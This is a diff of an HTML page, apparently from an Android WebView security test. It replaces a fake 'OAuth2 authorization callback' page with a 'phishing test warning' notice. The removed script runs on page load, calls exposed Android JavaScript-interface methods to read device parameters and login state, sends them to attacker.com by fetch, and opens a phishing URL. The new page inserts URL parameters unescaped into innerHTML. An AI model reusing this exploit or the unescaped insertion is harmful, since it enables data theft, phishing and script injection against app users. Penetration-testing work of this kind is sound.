@@ -3,132 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OAuth2 授权回调</title>
+    <title>⚠️ 安全测试警告</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
             padding: 20px;
+            background: #fff3cd;
         }
-        .container {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-            max-width: 400px;
-            width: 100%;
-            padding: 40px 30px;
-            text-align: center;
-        }
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 36px;
+        .warning {
+            background: #dc3545;
             color: white;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
         }
-        h1 { font-size: 24px; color: #333; margin-bottom: 10px; }
-        .subtitle { color: #666; font-size: 14px; margin-bottom: 30px; }
-        .loading {
-            display: inline-block;
-            width: 40px;
-            height: 40px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        .info {
+            background: #17a2b8;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { color: #666; font-size: 14px; margin-top: 20px; }
-        .error { color: #f44336; font-size: 14px; margin-top: 15px; display: none; }
-        .success { color: #4CAF50; font-size: 14px; margin-top: 15px; display: none; }
+        code {
+            background: #343a40;
+            color: #00ff00;
+            padding: 10px;
+            display: block;
+            margin: 10px 0;
+            border-radius: 3px;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">🔐</div>
-        <h1>授权回调处理中</h1>
-        <p class="subtitle">正在验证您的身份，请稍候...</p>
-        
-        <div class="loading" id="loading"></div>
-        <p class="status" id="status">正在连接授权服务器...</p>
-        <p class="error" id="errorMsg"></p>
-        <p class="success" id="successMsg">授权成功！正在跳转...</p>
+    <div class="warning">
+        <h1>⚠️ 安全测试警告</h1>
+        <p><strong>这是一个钓鱼攻击测试页面！</strong></p>
+        <p>如果这是真实攻击，您的百度账号密码已经被窃取。</p>
     </div>
-
-    <script>
-    // 主攻击函数
-    function executeAttack() {
-        console.log("[*] 开始执行攻击...");
-        
-        // 检查 Android 接口是否存在
-        if (typeof Android === 'undefined') {
-            console.log("[-] Android 接口未定义");
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('errorMsg').style.display = 'block';
-            document.getElementById('errorMsg').innerText = '错误：环境不支持';
-            return;
-        }
-        
-        // Step 1: 尝试调用 getRequestParams (YearEndReportJsInterface)
-        try {
-            if (typeof Android.getRequestParams === 'function') {
-                console.log("[+] getRequestParams 可用");
-                var params = Android.getRequestParams();
-                console.log("[+] 获取设备参数:", params);
-                
-                // 外带数据
-                fetch('https://attacker.com/collect?data=' + encodeURIComponent(params));
-                
-                document.getElementById('status').innerText = '正在验证授权信息...';
-                
-                setTimeout(function() {
-                    document.getElementById('loading').style.display = 'none';
-                    document.getElementById('successMsg').style.display = 'block';
-                    
-                    // 尝试调用其他方法
-                    if (typeof Android.showToast === 'function') {
-                        Android.showToast('授权成功，正在同步数据');
-                    }
-                    
-                    if (typeof Android.openUrl === 'function') {
-                        setTimeout(function() {
-                            Android.openUrl('image', 'https://attacker.com/phishing.html');
-                        }, 2000);
-                    }
-                }, 1500);
-                
-            } else if (typeof Android.checkLogin === 'function') {
-                // InvitationalTestJsInterface
-                console.log("[+] checkLogin 可用");
-                var isLoggedIn = Android.checkLogin();
-                console.log("[+] 登录状态:", isLoggedIn);
-                
-                // 继续其他攻击...
-            } else {
-                throw new Error('未知的 JSInterface 类型');
-            }
-            
-        } catch(e) {
-            console.log("[-] 攻击失败:", e);
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('errorMsg').style.display = 'block';
-            document.getElementById('errorMsg').innerText = '错误：' + e.message;
-        }
-    }
     
-    // 页面加载后执行
-    window.onload = executeAttack;
+    <div class="info">
+        <h3>测试信息：</h3>
+        <p><strong>测试时间：</strong><span id="time"></span></p>
+        <p><strong>攻击已验证：</strong>是</p>
+        <p><strong>数据已保存：</strong>否（仅测试）</p>
+    </div>
+    
+    <h3>获取到的 URL 参数：</h3>
+    <div id="params"></div>
+    
+    <hr/>
+    <p style="color:red;"><strong>请立即修复 GrantWebActivity 漏洞！</strong></p>
+    
+    <script>
+        // 显示时间
+        document.getElementById('time').textContent = new Date().toLocaleString('zh-CN');
+        
+        // 解析 URL 参数
+        const urlParams = new URLSearchParams(window.location.search);
+        let paramsHtml = '<ul>';
+        for (const [key, value] of urlParams.entries()) {
+            paramsHtml += `<li><strong>${key}:</strong> ${value}</li>`;
+        }
+        paramsHtml += '</ul>';
+        document.getElementById('params').innerHTML = paramsHtml;
+        
+        // 在控制台输出（用于调试）
+        console.log('=== 安全测试 ===');
+        for (const [key, value] of urlParams.entries()) {
+            console.log(`${key}: ${value}`);
+        }
     </script>
 </body>
 </html>
